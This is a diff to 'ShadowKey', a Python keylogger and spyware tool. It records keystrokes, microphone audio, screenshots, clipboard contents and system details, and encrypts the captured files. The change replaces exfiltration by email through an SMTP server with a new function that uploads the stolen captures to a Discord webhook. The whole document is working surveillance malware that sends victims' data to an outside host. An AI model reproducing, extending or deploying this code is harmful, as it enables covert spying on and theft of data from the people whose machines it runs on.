@@ -16,29 +16,19 @@ print('''
         [ Created by Shubham Kumar                      ]
 ''')
 
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-
 import socket
 import platform
 import subprocess
-
 from pynput.keyboard import Key, Listener
-
 import time
 import os
-
 from scipy.io.wavfile import write
 import sounddevice as sd
-
 from cryptography.fernet import Fernet
-
 import getpass
-from requests import get
-
+from requests import post, get
+import json
+from datetime import datetime
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
@@ -56,9 +46,9 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "add_temp_mail"
-password = "no_password_needed"
-toaddr = "add_email"
+# Discord webhook configuration
+WEBHOOK_URL = "add_your_webhook_url_here"
+SHADOW_KEY_AVATAR = "https://i.imgur.com/your-avatar-image.png"  # Optional: Avatar URL for webhook
 username = getpass.getuser()
 key = "C0DcvpYhOHDzR4ybk5S8fYIjf7axzR6gxWP5ervjXGo="
 file_path = os.path.expanduser("~/Documents/ShadowKey/Files")
@@ -66,32 +56,61 @@ extend = "/"
 file_merge = file_path + extend
 os.makedirs(file_path, exist_ok=True)
 
-def send_email(filename, attachment, toaddr):
+def send_to_discord(filename, filepath):
     try:
-        fromaddr = email_address
-        msg = MIMEMultipart()
-        msg['From'] = fromaddr
-        msg['To'] = toaddr
-        msg['Subject'] = f"ShadowKey Log - {filename}"
-        body = f"Log file collected at {time.strftime('%Y-%m-%d %H:%M:%S')}"
-        msg.attach(MIMEText(body, 'plain'))
-        if not os.path.exists(attachment):
-            print(f"[-] File not found: {attachment}")
+        if not os.path.exists(filepath):
+            print(f"[-] File not found: {filepath}")
             return
-        with open(attachment, 'rb') as f:
-            p = MIMEBase('application', 'octet-stream')
-            p.set_payload(f.read())
-        encoders.encode_base64(p)
-        p.add_header('Content-Disposition', f"attachment; filename= {filename}")
-        msg.attach(p)
-        s = smtplib.SMTP('smtp.yopmail.com', 587)
-        s.starttls()
-        text = msg.as_string()
-        s.sendmail(fromaddr, toaddr, text)
-        s.quit()
-        print(f"[+] Email sent successfully: {filename}")
+            
+        # Read file content
+        with open(filepath, 'rb') as f:
+            file_content = f.read()
+            
+        # Create embed for rich formatting
+        timestamp = datetime.now().isoformat()
+        embed = {
+            "title": "ShadowKey Log Notification",
+            "description": f"New data captured: `{filename}`",
+            "color": 0x00ff00,  # Green color
+            "timestamp": timestamp,
+            "fields": [
+                {
+                    "name": "File Type",
+                    "value": filename.split('.')[-1].upper(),
+                    "inline": True
+                },
+                {
+                    "name": "Captured At",
+                    "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    "inline": True
+                }
+            ],
+            "footer": {
+                "text": "ShadowKey v1.0.0"
+            }
+        }
+            
+        # Prepare the payload
+        payload = {
+            "username": "ShadowKey",
+            "avatar_url": SHADOW_KEY_AVATAR,
+            "embeds": [embed]
+        }
+
+        # Send file with the message
+        files = {
+            'payload_json': (None, json.dumps(payload)),
+            'file': (filename, file_content)
+        }
+        
+        response = post(WEBHOOK_URL, files=files)
+        if response.status_code in [200, 204]:  # Both are valid success codes
+            print(f"[+] Discord notification sent: {filename}")
+        else:
+            print(f"[-] Failed to send Discord notification: {response.status_code}")
+            
     except Exception as e:
-        print(f"[-] Failed to send email: {str(e)}")
+        print(f"[-] Error sending to Discord: {str(e)}")
 
 
 def computer_information():
@@ -178,7 +197,7 @@ while number_of_iterations < number_of_iterations_end:
             f.write(" ")
 
         screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+        send_to_discord(screenshot_information, file_path + extend + screenshot_information)
 
         copy_clipboard()
 
@@ -205,7 +224,7 @@ for encrypting_file in files_to_encrypt:
     with open(encrypted_file_names[count], 'wb') as f:
         f.write(encrypted)
 
-    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    send_to_discord(encrypted_file_names[count], encrypted_file_names[count])
     count += 1
 
 time.sleep(120)
